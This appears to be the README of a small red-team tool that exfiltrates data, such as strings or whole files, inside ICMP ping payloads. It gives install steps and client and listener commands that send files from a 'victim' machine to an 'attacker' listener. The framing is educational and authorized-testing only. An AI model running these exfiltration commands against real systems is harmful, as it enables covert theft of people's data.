# PingExfiltration

A tiny pair of scripts that demonstrate data exfiltration using ICMP Echo Request (ping) packets. The `server.py` script listens for incoming ICMP Echo Request payloads and prints any data found in the ICMP payload. The `client.py` script sends data inside ICMP Echo Request packets.

These scripts are intended for authorized testing, learning, and lab use only. Do not use them against systems you do not own or have explicit permission to test.

**Requirements**
- **Python:** 3.7+
- **Library:** `scapy` (install with `pip install scapy`)
- **Permissions:** Running packet-crafting and sniffing usually requires elevated privileges (Administrator on Windows, root on Linux). On Windows, installing Npcap/WinPcap may be required for sniffing.

**Quick summary**
- `server.py`: Run on the attacker's machine / listener (where you want to receive exfiltrated data).
- `client.py`: Run on the target/victim machine (the machine from which data should be sent).

**Installation**
1. Create a virtual environment (optional but recommended):

```powershell
python -m venv .venv
.\.venv\Scripts\Activate.ps1
```

2. Install `scapy`:

```powershell
pip install scapy
```

3. (Windows) If you plan to sniff packets with `scapy`, install Npcap (https://nmap.org/npcap/) and allow raw packet capture.

4. Run the scripts with Administrator/root privileges.

**Usage**

Server (listener):

```powershell
# Basic - listen on default interface
python server.py

# Listen on a specific interface (name depends on your OS):
python server.py -i "Ethernet"

# Enable raw mode (escape newlines when printing):
python server.py -r

# Filter by source IP (only accept ICMP from given IP):
python server.py --src 10.0.0.5

# Combine options:
python server.py -i "Ethernet" -r --src 10.0.0.5
```

Client (sender):

```powershell
# Send a simple string to the listener at 192.0.2.1
python client.py -t 192.0.2.1 -d "secret_data"

# Read a file and send it. If file is large it will be chunked automatically.
python client.py -t 192.0.2.1 -f C:\path\to\file.txt

# Use a custom separator for chunked data (default is "-:-")
python client.py -t 192.0.2.1 -f C:\path\to\file.txt -s "::SEP::"

# Override source IP (requires appropriate privileges / routing):
python client.py -t 192.0.2.1 -d "data" --src 10.0.0.2
```

**How the communication works**
- `client.py` sends ICMP Echo Request (type 8) packets with the data in the ICMP payload.
- If a file is larger than ~1000 bytes, the client chunks the file and prefixes non-final chunks with the configured separator so the listener can reassemble them.
- `server.py` inspects ICMP Echo Request packets and prints the payload. If it sees the separator it accumulates chunks until the final chunk arrives, then prints the reassembled data.

**Notes & tips**
- Both scripts depend only on the `scapy` library.
- Running these scripts requires elevated privileges. On Linux, use `sudo` or run as root; on Windows, run in an elevated terminal.
- Network devices or firewalls may block ICMP traffic; ensure ICMP Echo Requests are permitted between sender and listener.
- This tool is educational. Do not use for malicious activity.

**License & Ethics**
Use only for authorized security testing, research, or educational purposes. The author is not responsible for misuse.
